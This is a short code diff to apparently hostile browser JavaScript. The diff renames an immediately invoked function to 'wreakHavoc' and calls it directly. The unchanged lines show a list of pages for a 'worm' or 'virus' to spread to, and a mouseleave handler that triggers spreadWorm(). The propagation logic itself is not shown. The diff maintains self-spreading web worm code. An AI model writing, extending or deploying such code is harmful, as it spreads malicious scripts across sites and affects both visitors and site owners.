@@ -1,4 +1,4 @@
-(function () {
+(function wreakHavoc() {
     // List of URLs to spread to (add the URLs of the other pages where you want the worm to go)
     const pagesToSpreadTo = [
       // Add pages for virus to spread to...
@@ -47,4 +47,5 @@
     document.addEventListener('mouseleave', function() {
         spreadWorm(); // Call the spreadWorm function when the mouse leaves the page
     });
-})();
+})
+wreakHavoc();
